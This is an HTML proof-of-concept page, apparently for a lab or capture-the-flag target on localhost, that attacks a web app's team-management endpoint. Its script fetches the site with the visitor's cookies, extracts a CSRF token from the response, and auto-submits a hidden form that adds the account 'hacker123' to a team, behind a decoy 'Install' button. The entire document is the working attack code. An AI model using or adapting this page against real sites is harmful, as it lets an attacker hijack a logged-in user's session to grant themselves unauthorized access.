<!DOCTYPE html>
<html>
<body>
  <form id="exploitForm" action="http://localhost:3000/api/teams/1/addUser/hacker123" method="POST">
    <input type="hidden" name="csrfToken" id="csrfTokenInput">
    <input type="submit" id="installbutton" value="Install">
  </form>
  <script>
    // Fetch the admin's CSRF token by exploiting XSS or accessing a page that exposes it
    fetch('http://localhost:3000/', {
      credentials: 'include'
    })
    .then(response => response.text())
    .then(data => {
      // Extract CSRF token from the dashboard page (assumes it's included in the response)
      const parser = new DOMParser();
      const doc = parser.parseFromString(data, 'text/html');
      const csrfToken = doc.querySelector('input[name="csrfToken"]').value;
      document.getElementById('csrfTokenInput').value = csrfToken;
      // Auto-submit the form
      document.getElementById('exploitForm').submit();
    })
    .catch(err => console.error('Error:', err));
  </script>
</body>
</html>
